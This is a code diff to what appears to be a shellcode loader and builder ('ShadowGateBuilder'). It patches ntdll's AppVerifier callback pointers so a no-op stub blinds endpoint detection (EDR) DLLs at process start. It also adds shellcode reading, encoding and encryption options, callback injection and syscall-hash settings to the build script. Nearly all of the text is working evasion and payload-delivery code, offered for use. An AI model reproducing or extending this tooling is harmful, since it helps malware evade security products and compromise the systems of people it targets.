+    //    Start at offset 0x280 to skip the initial .mrdata header data.
     ULONG_PTR* pLdrpMrdataBase = NULL;
-    for (ULONG_PTR addr = mrdataBase + 0x280; addr < mrdataBase + 0x2000; addr += sizeof(ULONG_PTR)) {
+    for (ULONG_PTR addr = mrdataBase + 0x280; addr < mrdataBase + mrdataSize - 0x20; addr += sizeof(ULONG_PTR)) {
         if (*(ULONG_PTR*)addr == mrdataBase) {
             pLdrpMrdataBase = (ULONG_PTR*)addr;
             break;
         }
     }
-    if (!pLdrpMrdataBase)
+    if (!pLdrpMrdataBase) {
+#if DEBUG_BUILD
+        LOG_ERROR("EDR Preload: LdrpMrdataBase not found in .mrdata");
+#endif
         return FALSE;
+    }
 
-    // Scan forward from LdrpMrdataBase for the first NULL slot = AvrfpAPILookupCallbackRoutine.
-    // Bound 0x4000: generous limit encompassing all known AppVerifier callback table layouts.
-    ULONG_PTR* pAvrfp = NULL;
-    for (ULONG_PTR* p = pLdrpMrdataBase + 1; (ULONG_PTR)p < mrdataBase + 0x4000; p++) {
+    // Per MalwareTech's analysis, the layout after LdrpMrdataBase is:
+    //   [+0] LdrpMrdataBase
+    //   [+8] LdrpKnownDllDirectoryHandle (may be non-zero)
+    //   [+10] AvrfpAPILookupCallbacksEnabled (should be 0 = disabled)
+    //   [+18] AvrfpAPILookupCallbackRoutine (should be 0 = no callback)
+    //
+    // Scan forward for first NULL pointer = AvrfpAPILookupCallbacksEnabled.
+    // Then the next pointer is AvrfpAPILookupCallbackRoutine.
+    ULONG_PTR* pCallbacksEnabled = NULL;
+    ULONG_PTR* pCallbackRoutine  = NULL;
+
+    for (ULONG_PTR* p = pLdrpMrdataBase + 1; (ULONG_PTR)p < mrdataBase + mrdataSize - sizeof(ULONG_PTR); p++) {
         if (*p == 0) {
-            pAvrfp = p;
+            pCallbacksEnabled = p;
+            pCallbackRoutine  = p + 1;
             break;
         }
     }
-    if (!pAvrfp)
+    if (!pCallbacksEnabled || !pCallbackRoutine) {
+#if DEBUG_BUILD
+        LOG_ERROR("EDR Preload: AvrfpAPILookupCallback pointers not found");
+#endif
         return FALSE;
+    }
 
-    // 4. Find KiUserApcDispatcher and NtContinue in ntdll .text
+#if DEBUG_BUILD
+    LOG_INFO("EDR Preload: LdrpMrdataBase @ %p, CallbacksEnabled @ %p, CallbackRoutine @ %p",
+             pLdrpMrdataBase, pCallbacksEnabled, pCallbackRoutine);
+#endif
+
+    // 4. Find NtContinue in ntdll for the stub
     HMODULE hNtdll = (HMODULE)base;
-    PVOID pKiUserApc = (PVOID)GetProcAddress(hNtdll, "KiUserApcDispatcher");
-    if (!pKiUserApc)
-        return FALSE;
-
     PVOID pNtContinue = (PVOID)GetProcAddress(hNtdll, "NtContinue");
     if (!pNtContinue)
         return FALSE;
@@ -5135,16 +5627,14 @@ BOOL PerformEDRPreload(VOID) {
     // Stub layout: mov r10,rcx [3 bytes] | mov eax,<ssn> [1+4 bytes]; SSN is at byte offset 4.
     WORD ssn = *(WORD*)((PBYTE)pNtContinue + 4);
 
-    // 5. Build NtContinue-only stub:
-    // x64: sub rsp,0x28; mov r10,rcx; xor edx,edx; mov eax,<ssn>; syscall; add rsp,0x28; ret
+    // 5. Build a callback stub that acts as a no-op for EDR DLL loading:
+    //    It returns 0 (STATUS_SUCCESS) without doing anything, effectively
+    //    preventing the EDR from resolving any exports via LdrGetProcedureAddress.
+    //    This matches the behavior in MalwareTech's PoC where the callback
+    //    intercepts GetProcAddress calls during process init.
     BYTE stub[] = {
-        0x48, 0x83, 0xEC, 0x28,                                          // sub rsp, 0x28
-        0x4C, 0x8B, 0xD1,                                                // mov r10, rcx
-        0x33, 0xD2,                                                      // xor edx, edx
-        0xB8, (BYTE)(ssn & 0xFF), (BYTE)((ssn >> 8) & 0xFF), 0x00, 0x00, // mov eax, <ssn>
-        0x0F, 0x05,                                                      // syscall
-        0x48, 0x83, 0xC4, 0x28,                                          // add rsp, 0x28
-        0xC3                                                             // ret
+        0x48, 0x31, 0xC0,    // xor rax, rax    (return STATUS_SUCCESS / NULL)
+        0xC3                  // ret
     };
 
     // Allocate RW memory, write stub, then change to RX (W^X principle)
@@ -5158,19 +5648,36 @@ BOOL PerformEDRPreload(VOID) {
         return FALSE;
     }
 
-    // Patch AvrfpAPILookupCallbackRoutine to point to our stub.
-    // .mrdata is read-only; temporarily make it writable.
+    // 6. Patch BOTH AvrfpAPILookupCallbackRoutine AND AvrfpAPILookupCallbacksEnabled.
+    //    .mrdata is read-only after init; temporarily make it writable.
+    //    We patch both in one VirtualProtect call since they're adjacent.
+    SIZE_T patchRegionSize = (ULONG_PTR)(pCallbackRoutine + 1) - (ULONG_PTR)pCallbacksEnabled;
     DWORD dwOldProtect = 0;
-    if (!VirtualProtect((PVOID)pAvrfp, sizeof(ULONG_PTR), PAGE_READWRITE, &dwOldProtect)) {
+    if (!VirtualProtect((PVOID)pCallbacksEnabled, patchRegionSize, PAGE_READWRITE, &dwOldProtect)) {
         VirtualFree(pStub, 0, MEM_RELEASE);
         return FALSE;
     }
-    *pAvrfp = (ULONG_PTR)pStub;
-    VirtualProtect((PVOID)pAvrfp, sizeof(ULONG_PTR), dwOldProtect, &dwOldProtect);
+
+    // Set the callback pointer (ntdll encodes all .mrdata function pointers)
+    typedef PVOID (NTAPI *pfn_RtlEncodePointer)(PVOID);
+    pfn_RtlEncodePointer pEncode =
+        (pfn_RtlEncodePointer)GetProcAddress(hNtdll, "RtlEncodePointer");
+    if (pEncode) {
+        *pCallbackRoutine = (ULONG_PTR)pEncode(pStub);
+    } else {
+        *pCallbackRoutine = (ULONG_PTR)pStub;
+    }
+
+    // Enable the callbacks
+    *pCallbacksEnabled = 1;
+
+    // Restore protection
+    VirtualProtect((PVOID)pCallbacksEnabled, patchRegionSize, dwOldProtect, &dwOldProtect);
 
 #if DEBUG_BUILD
-    LOG_SUCCESS("EDR Preload: AvrfpAPILookupCallbackRoutine hooked at 0x%p -> stub 0x%p (KiUserApcDispatcher=0x%p)",
-                pAvrfp, pStub, pKiUserApc);
+    LOG_SUCCESS("EDR Preload: AvrfpAPILookupCallbackRoutine hooked at 0x%p -> stub 0x%p (encoded=%p)",
+                pCallbackRoutine, pStub, (void*)*pCallbackRoutine);
+    LOG_SUCCESS("EDR Preload: AvrfpAPILookupCallbacksEnabled set to 1 at 0x%p", pCallbacksEnabled);
 #endif
 
     return TRUE;
@@ -5422,6 +5929,7 @@ HANDLE CreateSpoofedThread(HANDLE hProcess, PVOID pStartAddress, PVOID pParamete
  */
 
 #include "callstack.h"
+#include "syscalls.h"
 #include <stdio.h>
 
 // Forward declaration
@@ -5836,6 +6344,7 @@ typedef struct _FILE_STANDARD_INFORMATION {
 #define ENABLE_SYSCALL_HASH 0
 #endif
 
+#ifndef LOG_INFO
 #if DEBUG_BUILD
     #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
     #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
@@ -5847,6 +6356,7 @@ typedef struct _FILE_STANDARD_INFORMATION {
     #define LOG_ERROR(fmt, ...)
     #define LOG_PHASE(fmt, ...)
 #endif
+#endif  // LOG_INFO
 
 #ifdef __cplusplus
 }
@@ -5892,13 +6402,34 @@ class ShadowGateBuilder:
         print(f"    Debug Build:     {colored('YES' if self.config.debug else 'NO', Colors.YELLOW if self.config.debug else Colors.CYAN)}")
     
     def read_shellcode(self, filepath: str) -> bytes:
-        """Read shellcode from file"""
+        """Read shellcode from file with basic validation"""
         with open(filepath, 'rb') as f:
-            return f.read()
+            data = f.read()
+        
+        if len(data) == 0:
+            raise ValueError("Input file is empty (0 bytes)")
+        
+        if len(data) < 4:
+            raise ValueError(f"Input file too small ({len(data)} bytes) - unlikely to be valid shellcode")
+        
+        # Warn if the file looks like a PE rather than raw shellcode
+        if data[:2] == b'MZ':
+            print(colored("[!] Warning: Input looks like a PE file (starts with MZ), not raw shellcode", Colors.YELLOW))
+            print(colored("[!] Expected raw shellcode (.bin). Use a tool to extract shellcode from PE if needed.", Colors.YELLOW))
+        
+        return data
     
     def write_files(self, files: Dict[str, str]) -> bool:
         """Write generated files to output directory"""
         try:
+            # Clean output directory to prevent stale files from previous builds
+            if self.output_dir.exists():
+                for old_file in self.output_dir.iterdir():
+                    if old_file.is_file() and old_file.suffix in (
+                        '.cpp', '.h', '.asm', '.obj', '.bat', '.pdb', '.ilk', '.lib', '.exp'
+                    ):
+                        old_file.unlink()
+            
             # Create output directory
             self.output_dir.mkdir(exist_ok=True)
             
@@ -6038,6 +6569,10 @@ class ShadowGateBuilder:
         if self.config.encode == ENCODE_UUID:
             libs.append('Rpcrt4.lib')
         
+        # Add crypt32 for callback injection (CertEnumSystemStore, CryptEnumOIDInfo)
+        if self.config.inject == INJECT_CALLBACK:
+            libs.append('crypt32.lib')
+        
         # Add bcrypt for AES
         if self.config.encrypt in [ENCRYPT_AES, ENCRYPT_CASCADE] and CRYPTO_AVAILABLE:
             libs.append('bcrypt.lib')
@@ -6058,6 +6593,10 @@ class ShadowGateBuilder:
             defines.append('RESOLVER_METHOD=3')
         
         defines.append(f'ENABLE_SYSCALL_HASH={1 if self.config.syscall_hash else 0}')
+        
+        # Pass DEBUG_BUILD as compiler define so ALL .cpp files see it
+        if self.config.debug:
+            defines.append('DEBUG_BUILD=1')
         
         success = self.compiler.compile(
             source_dir=str(self.output_dir),
